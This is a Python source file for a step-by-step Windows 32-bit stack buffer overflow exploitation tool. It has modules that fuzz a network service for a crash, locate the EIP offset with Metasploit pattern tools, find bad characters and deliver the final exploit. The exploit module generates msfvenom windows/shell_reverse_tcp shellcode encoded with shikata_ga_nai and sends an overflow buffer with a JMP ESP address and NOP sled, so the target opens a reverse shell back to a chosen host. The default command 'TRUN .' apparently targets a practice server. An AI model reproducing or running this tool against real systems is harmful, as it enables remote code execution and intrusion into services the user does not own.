import argparse
import socket
import ipaddress
import colorama
import sys
import string
import time
import subprocess
import struct
import binascii

# -------------- GLOBALS --------------
TIMEOUT = 2
PATTERN_CREATE = '/usr/share/metasploit-framework/tools/exploit/pattern_create.rb'
PATTERN_OFFSET = '/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb'
BAD_CHARS = [0x00]
LHOST = '192.168.56.103'
LPORT = 4444
# ------------ END GLOBALS ------------

# -------------- EXPLOIT --------------
def EXPLOIT(sock, buffer):
    sock.recv()
    cmd = b'TRUN .' + buffer
    sock.send(cmd)
# ------------ END EXPLOIT ------------

def e(*args, frame_index=1, **kvargs):
    frame = sys._getframe(frame_index)

    vals = {}

    vals.update(frame.f_globals)
    vals.update(frame.f_locals)
    vals.update(kvargs)

    return string.Formatter().vformat(' '.join(args), args, vals)

def cprint(*args, color=colorama.Fore.RESET, char='*', sep=' ', end='\n', frame_index=1, file=sys.stdout, **kvargs):
    frame = sys._getframe(frame_index)

    vals = {
        'bgreen':  colorama.Fore.GREEN  + colorama.Style.BRIGHT,
        'bred':    colorama.Fore.RED    + colorama.Style.BRIGHT,
        'bblue':   colorama.Fore.BLUE   + colorama.Style.BRIGHT,
        'byellow': colorama.Fore.YELLOW + colorama.Style.BRIGHT,
        'bmagenta': colorama.Fore.MAGENTA + colorama.Style.BRIGHT,

        'green':  colorama.Fore.GREEN,
        'red':    colorama.Fore.RED,
        'blue':   colorama.Fore.BLUE,
        'yellow': colorama.Fore.YELLOW,
        'magenta': colorama.Fore.MAGENTA,

        'bright': colorama.Style.BRIGHT,
        'srst':   colorama.Style.NORMAL,
        'crst':   colorama.Fore.RESET,
        'rst':    colorama.Style.NORMAL + colorama.Fore.RESET
    }

    vals.update(frame.f_globals)
    vals.update(frame.f_locals)
    vals.update(kvargs)

    unfmt = ''
    if char is not None:
        unfmt += color + '[' + colorama.Style.BRIGHT + char + colorama.Style.NORMAL + ']' + colorama.Fore.RESET + sep
    unfmt += sep.join(args)

    fmted = unfmt

    for attempt in range(10):
        try:
            fmted = string.Formatter().vformat(unfmt, args, vals)
            break
        except KeyError as err:
            key = err.args[0]
            unfmt = unfmt.replace('{' + key + '}', '{{' + key + '}}')

    print(fmted, sep=sep, end=end, file=file)

def info(*args, sep=' ', end='\n', char='*', file=sys.stdout, **kvargs):
    cprint(*args, color=colorama.Fore.GREEN, char=char, sep=sep, end=end, file=file, frame_index=2, **kvargs)

def warn(*args, sep=' ', end='\n', file=sys.stderr, **kvargs):
    cprint(*args, color=colorama.Fore.YELLOW, char='!', sep=sep, end=end, file=file, frame_index=2, **kvargs)

def error(*args, sep=' ', end='\n', file=sys.stderr, **kvargs):
    cprint(*args, color=colorama.Fore.RED, char='!', sep=sep, end=end, file=file, frame_index=2, **kvargs)

def fail(*args, sep=' ', end='\n', char='*', file=sys.stdout, **kvargs):
    cprint(*args, color=colorama.Fore.RED, char=char, sep=sep, end=end, file=file, frame_index=2, **kvargs)
    exit(-1)

def parseArgs(module, target, port, pattern_length, offset, eip_value, local_host, local_port):
    global LPORT, LHOST
    try:
        ip = str(ipaddress.ip_address(target))
    except ValueError:
        fail("{red}-t/--target must be a valid IP address!")

    if port <= 0 or port > 65535:
        fail("{red}-p/--port must be between 0-65535!")

    if module == 'offset':
        if not pattern_length:
            fail("{red}-l/--pattern-length is required!")
        elif pattern_length <= 0:
            fail("{red}-l/--pattern-length > 0 required!")

    if module == 'badchars' or module == 'exploit' or module == 'check':
        if not offset:
            fail("{red}-o/--offset is required!")
        elif offset <= 0:
            fail("{red}-o/--offset > 0 required!")

    if module == 'exploit':
        if not eip_value:
            fail("{red}-eip/--eip-value is required!")
        if not local_host:
            fail("{red}-lhost/--local-host is required!")
        try:
            str(ipaddress.ip_address(local_host))
        except ValueError:
            fail("{red}-lhost/--local-host must be a valid IP address!")
        if not local_port:
            fail("{red}-lport/--local-port is required!")
        if local_port <= 0 or local_port > 65535:
            fail("{red}-lport/--local-port must be between 0-65535!")

        LHOST = local_host
        LPORT = local_port
        
    return target, port

def initBadChars(chars):
    global BAD_CHARS
    if chars:
        try:
            BAD_CHARS = [int(c, 16) for c in chars]
            BAD_CHARS.append(0x00)
        except:
            fail('Incorrect bad char given!')
    return BAD_CHARS

class SockManager:
    def __init__(self, target, port):
        self.target = target
        self.port = port

    def ping(self):
        self.open()
        try:
            self.recv(verbose=False)
            self.send(b'junk', verbose=False)
            self.close(verbose=False)
        except:
            fail(" {bred}Unreachable!{rst}" , char=None)
        info(' {bgreen}Available!{rst}', char=None)

    def isAlive(self):
        self.open(msg='Remote service always alive? Try to connect...\n')
        try:
            self.recv(verbose=False)
            self.send(b'junk',verbose=False)
            self.close(verbose=False)
        except:
            return False
        return True

    def open(self, msg='Connecting...'):
        try:
            info('[{bmagenta}%s{rst}:{bmagenta}%s{rst}] {bright}%s{rst}' % (self.target, self.port, msg), end='')
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.settimeout(TIMEOUT)
            self.s.connect((self.target, self.port))
        except:
            fail(" {bred}Unreachable!{rst}", char=None)

    def close(self, verbose=True):
        if verbose:
            info('{bright}Closed{rst}', char=None)
        self.s.close()

    def recv(self, size=1024, verbose=True):
        data = self.s.recv(size)
        if verbose:
            info(' {bright}Received {bblue}%d{rst} bytes ' % len(data), char=None, end='')

    def send(self, string, max_size=50, verbose=True):
        self.s.send(string)

        output = string
        if len(output) > max_size:
            output = string[:max_size] + b'...'
        if verbose:
            info('{bright}Sent {bblue}%d{rst} bytes: {bblue}%s{rst} ' % (len(string), output), char=None, end='')

def runCmd(cmd):
    try:
        info('{bright}Executing:{rst} {bblue}%s{rst}' % cmd)
        process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
    except Exception as e:
        fail('An error occurred while running: {bgreen}%s{rst}:\n{red}%s{rst}' % (cmd, e))

    return stdout

# ------------------ GET A REVERSE SHELL ------------------

class Bof:
    def __init__(self, target, port, offset, eip):
        self.sock = SockManager(target, port)
        self.sock.ping()
        self.offset = offset
        self.eip = eip
        self.generateShellcode()
        self.target = target
        self.port = port

    def generateShellcode(self):
        global LHOST, LPORT, BAD_CHARS

        option_bc = ""
        list_chars = ['\\x%0.2X' % e for e in BAD_CHARS]

        if len(BAD_CHARS) > 0:
            option_bc = '-b "' + ''.join(list_chars) + '"'
        cmd = 'msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=%s LPORT=%d -f py -e x86/shikata_ga_nai %s' % (LHOST, LPORT, option_bc)

        stdout = runCmd(cmd).decode().split("\n")

        self.shellcode = ""
        for line in stdout:
            if line.strip():
                print(line)
                self.shellcode += line.split(" ")[2][2:-1].replace('\\x', '')

        self.shellcode = binascii.unhexlify(self.shellcode.encode())
        info('Shellcode generated: {bblue}%d {rst}bytes' % len(self.shellcode))
        
    def exploit(self, nb_nop=16):
        
        EIP = struct.pack("<I", int(self.eip, 16))
        
        NOP = b'\x90' * nb_nop

        buffer = b'A'*self.offset + EIP + NOP + self.shellcode

        try:
            self.sock.open()
                
            EXPLOIT(self.sock, buffer)

            self.sock.close()

            info('[{bgreen}%s{rst}:{bgreen}%s{rst}] {bright}Payload Sent! Got a shell ?!' % (self.target, self.port))

        except Exception as err:
            fail(str(err))


# ---------------- END GET A REVERSE SHELL ----------------

# --------------------- FIND BAD CHARS --------------------

class BadChars:
    def __init__(self, target, port, offset):
        self.sock = SockManager(target, port)
        self.sock.ping()
        self.offset = offset
        self.target = target
        self.port = port

    def getDump(self, msg):
        hex_dump = input(msg)
        tmp_dump = hex_dump
        while tmp_dump.strip():
            tmp_dump = input()
            hex_dump += " " + tmp_dump
        return hex_dump

    def detectBadChar(self, dump):
        global BAD_CHARS

        dump = dump.split()
        dump_chars_as_int = []
        max_size = int(0xFF+1)
        while len(dump) < max_size:
            dump = self.getDump('Dump given is not enough large (len(dump)=%d < %d). Give me another...\n' % (len(dump), max_size))
            dump = dump.split()

        try:
            for i in range(0, max_size):
                dump_chars_as_int.append(int(dump[i], 16))
        except:
            fail('Bad input format: can\'t convert an Hex value...')

        all_chars_as_int = []
        for i in range(0x00, 0xFF+1):
            if i not in BAD_CHARS:
                all_chars_as_int.append(int(i))

        for i, char in enumerate(all_chars_as_int):
            if char != dump_chars_as_int[i]:
                fail('Bad Char found at index {bright}[%d]{rst}! {bred}%s{rst}' % (i, str(hex(char))))

        info('{bgreen}No bad char found!{rst}')

    def find(self):
        global BAD_CHARS

        all_chars= ""
        
        for i in range(0x00, 0xFF+1):
            if i not in BAD_CHARS:
                all_chars += chr(i)
        
        buffer = b'A'*self.offset + b'B'*4 + all_chars.encode()
        print(b"buffer == " + buffer)
        try:
            self.sock.open()

            EXPLOIT(self.sock, buffer)

            self.sock.close()
            
            # Check if remote service is always alive
            if self.sock.isAlive():
                fail('[{bred}%s{rst}:{bred}%s{rst}] {bred}Didn\'t crash!{rst}' % (self.target, self.port))
            else:
                info('[{bgreen}%s{rst}:{bgreen}%s{rst}] {bright}Crash occured! Check EIP value, it should be {byellow}42424242{rst} {bright}on the victim host{rst}' % (self.target, self.port))

        except Exception as err:
            fail(str(err))
        
        # Detect bad chars
        warn("{bright}(Right click on ESP value. Click \'Follow in Dump\'. Then, copy/paste hex dump){rst}")
        warn("{bright}(Right click on hex selection. Binary -> Binary Copy.){rst}")
        hex_dump = self.getDump('paste here and i will parse it...\n')
        self.detectBadChar(hex_dump)

# ------------------- END FIND BAD CHARS ------------------

# ------------------- VERIFY OFFSET FOUND -----------------

class CheckOverflow:
    def __init__(self, target, port, offset):
        self.sock = SockManager(target, port)
        self.sock.ping()
        self.offset = offset
        self.target = target
        self.port = port

    def validate(self, extra_size=600):
        buffer = b'A'*self.offset + b'B'*4 + b'C'*extra_size

        try:
            self.sock.open()

            EXPLOIT(self.sock, buffer)

            self.sock.close()
            
            # Check if remote service is always alive
            if self.sock.isAlive():
                fail('[{bred}%s{rst}:{bred}%s{rst}] {bred}Didn\'t crash!{rst}' % (self.target, self.port))
            else:
                info('[{bgreen}%s{rst}:{bgreen}%s{rst}] {bright}Crash occured! Check EIP value, it should be {byellow}42424242{rst} {bright}on the victim host{rst}' % (self.target, self.port))

        except Exception as err:
            info('{bred}Exception:{rst}', char=None)
            fail(str(err))

# ---------------- END VERIFY OFFSET FOUND ----------------

# -------------------- FIND EIP OFFSET --------------------

class OffsetFinder:
    def __init__(self, target, port, pattern_length=300):
        self.sock = SockManager(target, port)
        self.sock.ping()
        self.target = target
        self.port = port

        # /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
        self.pattern_length = pattern_length
        self.pattern = runCmd('%s -l %d' % (PATTERN_CREATE, pattern_length))
        info('{bright}Pattern generated:{rst} {bblue}%s{rst}' % self.pattern.decode().strip())

    def get(self):
        try:
            self.sock.open()

            EXPLOIT(self.sock, self.pattern)

            self.sock.close()

            # Check if remote service is always alive
            if self.sock.isAlive():
                fail('[{bred}%s{rst}:{bred}%s{rst}] {bred}Didn\'t crash!{rst}' % (self.target, self.port))
            else:
                info('[{bgreen}%s{rst}:{bgreen}%s{rst}] {bright}Crash occured!{rst}' % (self.target, self.port))
        except Exception as err:
            info('{bred}Exception:{rst}', char=None)
            fail(str(err))

        warn("{bright}(enter eip value found on the victim host): {rst}", sep=' ', end='')
        eip_value = input('')
        # /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_VALUE> -l 300
        cmd = PATTERN_OFFSET + " -q %s -l %d" % (eip_value, self.pattern_length)
        stdout = runCmd(cmd).decode()
        if stdout:
            info('[{bgreen}%s{rst}:{bgreen}%s{rst}] {byellow}Offset found!{rst} {bred}>> %s <<{rst}' % (self.target, self.port, stdout.split(' ')[-1].strip()))
        else:
            fail('[{bred}%s{rst}:{bred}%s{rst}] {bred}Offset Not found!{rst}' % (self.target, self.port))

# ------------------ END FIND EIP OFFSET ------------------

# ----------------------- FIND CRASH ----------------------

class Fuzzing:
    def __init__(self, target, port):
        self.sock = SockManager(target, port)
        self.sock.ping()
        self.target = target
        self.port = port

    def fuzz(self, step=200):
        buffer = b'A' * step

        while True:
            try:
                self.sock.open()

                EXPLOIT(self.sock, buffer)

                self.sock.close()
                time.sleep(1)
                
                buffer += b'A' * step
            except socket.timeout:
                info('{bred}Crashed!{rst}', char=None)
                info('[{bgreen}%s{rst}:{bgreen}%s{rst}] Fuzzing crashed at {bblue}%s{rst} bytes' % (self.target, self.port, str(len(buffer) - step)))
                sys.exit(0)
            except Exception as e:
                info('{bred}Exception:{rst}', char=None)
                fail(str(e))


# --------------------- END FIND CRASH --------------------

def help(target, port):
    cprint(' {bright}---------- HELP ----------{rst}\n\n\
{bred}{bright}[STEP 1]{rst} Trigger an overflow\n\n\
{bgreen}[+]{rst} Modify {bmagenta}EXPLOIT(sock, buffer){rst}\n\
{bgreen}[+]{rst} {bright}python3 win32bof.py fuzz -t {target} -p {port}{rst}\n\
(output) > {bblue}Fuzzing crashed at {byellow}<BUFFER_LEN>{bblue} bytes{rst}\n\n\
{bred}{bright}[STEP 2]{rst} Get EIP location\n\n\
{bgreen}[+]{rst} {bright}python3 win32bof.py offset -t {target} -p {port} -pl {byellow}<PATTERN_LEN>{rst}\n\
(output) > {bblue}(eip value): {byellow}<ENTER_EIP_VALUE>{rst}\n\
(output) > {bblue}(offset): {byellow}<OFFSET>{rst}\n\n\
{bred}{bright}[STEP 3]{rst} Check EIP and confirm length of shellcode\n\n\
{bgreen}[+]{rst} {bright}python3 win32bof.py check -t {target} -p {port} -o{byellow} <OFFSET>{rst}\n\n\
{bred}{bright}[STEP 4]{rst} Find bad chars\n\n\
{bgreen}[+]{rst} {bright}python3 win32bof.py badchars -t {target} -p {port} -o{byellow} <OFFSET>{rst} -b {byellow}<CHAR_1> <CHAR_2> {rst}...\n\n\
{bred}{bright}[STEP 5]{rst} Find JMP ESP (or PUSH ESP RETN)\n\n\
{bgreen}[+]{rst} {bright}/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb{rst}\n\
(output) > {bblue}JMP ESP{rst}\n\
(output) > {bblue}FFE4{rst}\n\
{bgreen}[+]{rst} {bright}!mona modules{rst} (Look for no DEP, NX, ASLR && No Bad Char in address)\n\
{bgreen}[+]{rst} {bright}!mona find -s "\\xff\\xe4" -m {byellow}<MODULE>.dll{bright}{rst}{bright} -cpb {byellow}<BAD_CHARS>{rst}\n\
(gui output)> {byellow}<@JMP_ESP>{rst}\n\n\
{bred}{bright}[STEP 6]{rst} Exploit\n\n\
{bgreen}[+]{rst} Update {bmagenta}LHOST{rst} & {bmagenta}LPORT{rst} values\n\
{bgreen}[+]{rst} {bright}python3 win32bof.py exploit -t {target} -p {port} -o {byellow}<OFFSET>{rst}{bright} -eip {byellow}<@JMP_ESP>{rst}{bright} -b {byellow}<BAD_CHARS>{rst}\n\n\
{bright}[*] -------- END HELP --------{rst}')

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Fuzzing tool. (Python3 only)')
    parser.add_argument('module', choices=['help', 'fuzz', 'offset', 'check', 'badchars', 'exploit'])
    parser.add_argument('-t', '--target', help='IP address targeted.')
    parser.add_argument('-p', '--port', type=int, help='Port number targeted.')
    parser.add_argument('-l', '--pattern-length', type=int, help='Pattern length (generated with msfvenom).')
    parser.add_argument('-o', '--offset', type=int, help='EIP offset (found previously with **offset** module).')
    parser.add_argument('-eip', '--eip-value', help='Hex value which will replace EIP. Address where the shellcode is located.')
    parser.add_argument('-b', '--bad-chars', nargs="+", help='Hex chars to avoid in shellcode.')
    parser.add_argument('-lhost', '--local-host', help='Reverse shell IP address.')
    parser.add_argument('-lport', '--local-port', type=int, help='Reverse shell Port number.')
    args = parser.parse_args()

    target, port = parseArgs(args.module, args.target, args.port, args.pattern_length, args.offset, args.eip_value, args.local_host, args.local_port)
    BAD_CHARS = initBadChars(args.bad_chars)

    if args.module == 'help':
        help(target, port)
        sys.exit(0)

    info('{bright}----------- %s -----------{rst}' % args.module.upper())
    
    try:
        if args.module == 'fuzz':
            fuzzing = Fuzzing(target, port)
            fuzzing.fuzz()
        elif args.module == 'offset':
            offset = OffsetFinder(target, port, args.pattern_length)
            offset.get()
        elif args.module == 'check':
            check = CheckOverflow(target, port, args.offset)
            check.validate()
        elif args.module == 'badchars':
            bad = BadChars(target, port, args.offset)
            bad.find()
        elif args.module == 'exploit':
            bof = Bof(target, port, args.offset, args.eip_value)
            bof.exploit()
    except KeyboardInterrupt:
        fail('CTRL-C Exiting...')
    